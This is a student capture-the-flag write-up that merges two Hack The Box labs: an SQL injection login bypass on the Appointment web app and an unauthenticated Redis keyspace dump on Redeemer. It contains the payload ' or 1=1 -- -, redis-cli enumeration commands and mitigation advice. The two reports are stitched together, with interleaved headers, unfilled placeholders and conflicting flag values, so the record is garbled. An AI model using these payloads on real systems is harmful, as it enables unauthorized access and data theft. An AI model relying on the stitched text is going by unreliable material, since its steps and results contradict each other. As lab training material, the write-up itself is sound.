# Cybersecurity L4 [PR4] - Appointment

| | |
|---|---|
| **Machine** | Appointment (HTB Starting Point, Tier 0) |
| **Tier** | Easy |
| **OS** | Linux |
| **Target IP** | `10.129.150.47` |
| **HTB username** | architmishra015 |
| **Service exploited** | HTTP (port 80) - SQL injection login bypass |
| **Date** | 31 October 2026 |

> **Prior Level 4 submissions:** _<list your earlier merged L4 PRs here, e.g. Meow, Dancing, Redeemer>_
# Cybersecurity L4 [PR3] - Redeemer

| | |
|---|---|
| **Machine** | Redeemer (HTB Starting Point, Tier 0) |
| **Tier** | 🔴 Hard (Task 3) |
| **OS** | Linux (Ubuntu, kernel 5.4.0-77-generic) |
| **Target IP** | `10.129.150.3` |
| **HTB username** | architmishra15 |
| **Service exploited** | Redis 5.0.7 (unauthenticated, port 6379) |
| **Date** | 31 October 2026 |

> **Prior Level 4 submissions:** _<list your earlier merged L4 PRs here, e.g. Meow, Dancing>_

---

## 1. Summary

The Appointment booking web application on port 80 builds its login query directly from unsanitized user input. Submitting a SQL comment sequence in the username field closes off the rest of the query, allowing authentication to be bypassed without knowing any valid credentials.
Redeemer exposes a Redis key-value database to the network with **no authentication**. Anyone who can reach port 6379 can connect, dump the keyspace and read every stored value. The flag is stored as a plain Redis key named `flag`.

---

## 2. Reconnaissance: Nmap

Command used:

```bash
nmap -sC -sV -p- 10.129.150.47
nmap -sC -sV -p- 10.129.150.3
```

Full scan output:

```
<PASTE YOUR FULL NMAP OUTPUT HERE>
```

**Key finding:** TCP port **80** is open, serving an HTTP login page for an appointment-booking application.
**Key finding:** TCP port **6379** is open and runs Redis. A default Nmap scan only covers the top 1000 ports, so Redis on 6379 would be missed without the `-p-` option.

---

## 3. Enumeration and exploitation: step by step

### Step 1: Browse the web application

Navigated to `http://10.129.150.47/` in Firefox and found a **LOG IN** page requesting a username and password, with no other visible endpoints or registration option.

### Step 2: Identify the injection point

The login form submits the username and password to the backend, which most likely builds a query such as:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

Since the inputs are not sanitized, this is vulnerable to a classic SQL injection authentication bypass.

### Step 3: Craft the bypass payload

In the **username** field, entered:

```
' or 1=1 -- -
```

The password field required a non-empty value to pass client-side validation, so any placeholder value was entered there (the payload above makes the actual password value irrelevant to the query).

Submitted payload transforms the backend query into:

```sql
SELECT * FROM users WHERE username='' or 1=1 -- -' AND password='...'
```

`1=1` always evaluates true, and `-- -` comments out the rest of the query (including the password check), so the query returns a valid row.

### Step 4: Submit and bypass login

Clicked **Login**. The application authenticated the session without valid credentials and redirected to the post-login page.

### Step 5: Locate the flag

The first word returned on the authenticated webpage, and the flag itself, were visible directly on the page content after the bypass.
### Step 1: Connect to Redis with no credentials

```bash
redis-cli -h 10.129.150.3
```

The connection succeeded with no password prompt, so authentication is not enabled.

### Step 2: Fingerprint the server with `info`

```
10.129.150.3:6379> info
```

Relevant details from the output:

| Field | Value |
|---|---|
| `redis_version` | 5.0.7 |
| `redis_mode` | standalone |
| `os` | Linux 5.4.0-77-generic x86_64 |
| `tcp_port` | 6379 |
| `config_file` | /etc/redis/redis.conf |
| `connected_clients` | 1 |
| `role` | master |
| `cluster_enabled` | 0 |
| **Keyspace** | `db0:keys=4,expires=0,avg_ttl=0` |

The Keyspace section shows that database 0 holds **4 keys**, which is where to look next.

### Step 3: Select the database

```
10.129.150.3:6379> select 0
OK
```

### Step 4: List all keys

```
10.129.150.3:6379> keys *
1) "flag"
2) "numb"
3) "temp"
4) "stor"
```

Four keys came back, matching the `keys=4` count from `info`. One of them is called `flag`.

### Step 5: Read the flag

```
10.129.150.3:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

---

## 4. Recovered flag

```
e3d0796d002a446c0e622226f42e9672
```

Flag submitted and accepted on HTB (Root flag owned).

---

03e1d2b376c37ab3f5319922053953eb
```

The flag was accepted on HTB (Root flag owned).

---

## 5. Screenshots

**Active HTB session / target IP:**

![HTB session and target IP](./screenshots/session.png)

**Flag submission, Redeemer solved:**

![Redeemer solved](./screenshots/solved.png)

_Place both images in a `screenshots/` folder next to this file, or update the paths._

---

## 6. Takeaways and mitigation

- **Root cause:** user-supplied input was concatenated directly into a SQL query with no sanitization or parameterization, allowing a crafted comment sequence to alter query logic.
- **Fixes:**
  - Use parameterized queries / prepared statements instead of string concatenation.
  - Apply input validation and escaping on all user-supplied fields.
  - Use a least-privilege database account for the web application.
  - Implement a WAF and generic error messages to avoid leaking query structure.
- **Workflow learned:** when a login form looks custom-built, always test classic SQLi bypass payloads (`' or 1=1 -- -`, `' or '1'='1`, etc.) in the username field before looking for more complex vulnerabilities.
- **Root cause:** Redis was reachable from the network with no authentication.
- **Fixes:**
  - Set a strong `requirepass`, or use ACLs on Redis 6 and later.
  - Bind to `127.0.0.1` or a private interface only (`bind` in `redis.conf`).
  - Firewall port 6379 and keep `protected-mode yes`.
  - Never store secrets in plain keys.
- **Workflow learned:** full port scan, then connect, `info`, `select`, `keys *`, `get`. This applies to any exposed key-value service.

---

## 7. Proof
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/759347ee-7bac-4989-adfe-c0fac366f765" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/88161dcb-3ed2-40de-8007-462665b56530" />
